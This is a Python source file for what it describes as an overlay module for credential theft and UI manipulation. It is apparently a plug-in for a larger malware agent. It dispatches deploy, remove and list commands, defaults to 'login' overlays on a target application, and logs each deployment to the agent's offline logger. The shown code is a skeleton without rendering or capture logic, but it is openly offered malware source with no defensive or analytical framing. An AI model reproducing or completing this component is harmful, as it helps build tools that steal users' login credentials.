#!/usr/bin/env python3
"""
Overlay module for credential theft and UI manipulation
"""
import json
import time
from pathlib import Path

class OverlayModule:
    def __init__(self, agent):
        self.agent = agent
        self.active_overlays = {}
        
    def execute(self, command, args):
        """Execute overlay-related commands"""
        if command == "deploy":
            return self.deploy_overlay(args)
        elif command == "remove":
            return self.remove_overlay(args)
        elif command == "list":
            return self.list_overlays()
        else:
            return {"error": f"Unknown overlay command: {command}"}
    
    def deploy_overlay(self, args):
        """Deploy overlay on target application"""
        try:
            target_app = args.get("target_app")
            overlay_type = args.get("overlay_type", "login")
            
            if not target_app:
                return {"error": "target_app required"}
            
            # Create overlay configuration
            overlay_config = {
                "target": target_app,
                "type": overlay_type,
                "deployed_at": time.time(),
                "status": "active"
            }
            
            overlay_id = f"{target_app}_{int(time.time())}"
            self.active_overlays[overlay_id] = overlay_config
            
            # Log the deployment for offline storage
            self.agent.offline_logger.log_event("overlay_deployed", {
                "overlay_id": overlay_id,
                "target_app": target_app,
                "type": overlay_type
            })
            
            return {
                "success": True,
                "overlay_id": overlay_id,
                "message": f"Overlay deployed on {target_app}"
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    def remove_overlay(self, args):
        """Remove active overlay"""
        overlay_id = args.get("overlay_id")
        if overlay_id in self.active_overlays:
            del self.active_overlays[overlay_id]
            return {"success": True, "message": f"Overlay {overlay_id} removed"}
        else:
            return {"error": "Overlay not found"}
    
    def list_overlays(self):
        """List all active overlays"""
        return {
            "success": True,
            "overlays": self.active_overlays
        }
